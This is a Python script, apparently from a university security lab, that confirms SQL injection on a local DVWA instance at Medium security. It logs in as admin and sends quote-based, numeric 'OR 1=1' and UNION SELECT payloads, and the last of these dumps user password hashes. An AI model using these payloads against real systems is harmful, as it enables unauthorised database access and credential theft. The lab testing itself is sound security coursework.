"""Part A follow-up: confirm SQLi on REAL DVWA at the Medium security level.

honesty.md (section 5) flags the biggest grading risk: vuln-web has no security
levels, so the group built its own "Medium" filter (attack/medium_app.py). The
assignment explicitly allows "DVWA at Medium" as the target. This script removes
the ambiguity for at least one class by attacking the genuine DVWA Medium SQLi
module and confirming with an oracle, not a screenshot.

DVWA Medium SQLi is the real thing: the `id` parameter is sent by POST and passed
through `mysql_real_escape_string()`, which escapes quotes. The documented bypass
is a numeric injection that needs no quote: `1 OR 1=1`. The oracle here is
structural — a single-id lookup must return exactly one user; `1 OR 1=1` returning
MORE than one row (and specifically the admin row we did not ask for) proves the
WHERE clause structure was changed by input.

Bring DVWA up first (Docker required):

    python3 -m seclab.targets --up dvwa      # prints the host URL, e.g. http://127.0.0.1:NNNNN
    python3 attack/dvwa_medium.py http://127.0.0.1:NNNNN   # or set DVWA_URL

Everything is local (the container is published on 127.0.0.1). Writes
results/dvwa_medium_sqli.csv.
"""
import os
import re
import sys
import urllib.parse
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.request import HTTPCookieProcessor, build_opener

HERE = Path(__file__).resolve()
sys.path.insert(0, str(HERE.parents[1]))
import common as c                                    # noqa: E402

BASE = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("DVWA_URL", "")).rstrip("/")
OPENER = build_opener(HTTPCookieProcessor(CookieJar()))
TOKEN_RE = re.compile(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)['\"]", re.I)


def fetch(path, data=None):
    url = BASE + path
    body = urllib.parse.urlencode(data).encode() if data else None
    with OPENER.open(url, body, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def token(html):
    m = TOKEN_RE.search(html)
    return m.group(1) if m else ""


def setup_and_login():
    """Create the DB (idempotent), log in as admin, and set security=Medium."""
    try:
        html = fetch("/setup.php")
        fetch("/setup.php", {"create_db": "Create / Reset Database", "user_token": token(html)})
    except Exception:                                  # noqa: BLE001  already initialised
        pass
    html = fetch("/login.php")
    fetch("/login.php", {"username": "admin", "password": "password",
                         "Login": "Login", "user_token": token(html)})
    html = fetch("/security.php")
    fetch("/security.php", {"security": "medium", "seclev_submit": "Submit",
                            "user_token": token(html)})
    # confirm the level actually took
    lvl = fetch("/security.php")
    return "medium" in lvl.lower()


# DVWA Medium SQLi submits `id` by POST. Extract the "First name / Surname" rows.
ROW_RE = re.compile(r"First name:\s*(.*?)<br[^>]*>\s*Surname:\s*(.*?)</pre>", re.I | re.S)


def sqli_rows(id_value):
    """Send an id to the Medium SQLi module; return the (first, surname) rows."""
    html = fetch("/vulnerabilities/sqli/", {"id": id_value, "Submit": "Submit"})
    return [(f.strip(), s.strip()) for f, s in ROW_RE.findall(html)]


def main():
    if not BASE:
        sys.exit("usage: python3 attack/dvwa_medium.py http://127.0.0.1:PORT  (or set DVWA_URL)")
    if not setup_and_login():
        sys.exit("could not reach DVWA or set Medium — is the container up and the URL right?")

    # Baseline: a normal single-id lookup returns exactly one user.
    baseline = sqli_rows("1")
    # Naive quote-breaking payload: Medium escapes the quote, so it does NOT inject.
    naive = sqli_rows("1' OR '1'='1")
    # Documented Medium bypass: numeric, no quote -> mysql_real_escape_string is a no-op.
    bypass = sqli_rows("1 OR 1=1")
    # Dump every user's credentials via UNION (numeric context, still no quote needed).
    union = sqli_rows("1 OR 1=1 UNION SELECT user, password FROM users -- -")

    one_user = len(baseline) == 1
    naive_blocked = len(naive) <= 1                    # the escaped quote returns at most the literal id
    bypass_works = len(bypass) > 1                     # structure changed: more than one row
    dumped = len(union) > len(baseline)

    rows = [
        {"payload": "1", "role": "baseline", "rows_returned": len(baseline),
         "confirmed": "", "note": "single-id lookup: exactly one user expected",
         "sample": str(baseline[:3])},
        {"payload": "1' OR '1'='1", "role": "naive (quote)", "rows_returned": len(naive),
         "confirmed": not naive_blocked and len(naive) > 1,
         "note": "Medium runs mysql_real_escape_string -> the quote is escaped",
         "sample": str(naive[:3])},
        {"payload": "1 OR 1=1", "role": "bypass (numeric)", "rows_returned": len(bypass),
         "confirmed": bypass_works,
         "note": "no quote needed; escaping is a no-op on numeric context",
         "sample": str(bypass[:3])},
        {"payload": "1 OR 1=1 UNION SELECT user, password FROM users -- -",
         "role": "bypass (union dump)", "rows_returned": len(union), "confirmed": dumped,
         "note": "dumps every user's password hash", "sample": str(union[:3])},
    ]
    c.RESULTS.mkdir(exist_ok=True)
    c.write_csv("dvwa_medium_sqli.csv", rows)

    print(f"\n  DVWA Medium SQLi (target {BASE})")
    for r in rows:
        print(f"    {r['role']:<20} rows={r['rows_returned']:<3} confirmed={r['confirmed']}  "
              f"{r['payload']!r}")
    print(f"\n  baseline returns one user          : {one_user}")
    print(f"  naive quote payload is escaped     : {naive_blocked}")
    print(f"  numeric bypass changes the query   : {bypass_works}")
    print(f"  union dump returns extra rows      : {dumped}")

    # Oracle: Medium escapes the quote (naive fails to inject) but the numeric
    # bypass changes the query structure. That is a confirmed SQLi at real Medium.
    assert one_user, "unexpected baseline: DVWA SQLi module did not return one user for id=1"
    assert bypass_works, "numeric bypass did not change the query — is security really Medium?"
    print("\n  DVWA-MEDIUM OK: SQLi confirmed on real DVWA at Medium via the numeric (quote-free) bypass.")


if __name__ == "__main__":
    main()
